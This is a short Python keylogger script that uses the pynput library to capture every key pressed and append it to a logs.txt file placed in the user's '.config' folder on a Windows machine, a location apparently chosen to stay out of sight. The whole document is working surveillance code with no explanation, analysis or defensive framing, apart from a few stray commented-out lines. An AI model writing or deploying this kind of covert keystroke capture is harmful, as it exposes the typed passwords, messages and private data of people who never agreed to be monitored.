from pynput.keyboard import Listener
import os
i = 0
a = 2
#encode('utf-8')
user = os.getlogin()
path = "C:\\Users\\"+user+"\\.config\\logs.txt"
def write(key):
    #letter1  = "kiba"
    letter = str(key)
    letter =  " " + letter + "\n"
    #letter = letter.replace("u", "")
    fil = open(path, "a+")
    fil.write(letter)
with Listener(on_press=write) as l:
     l.join()
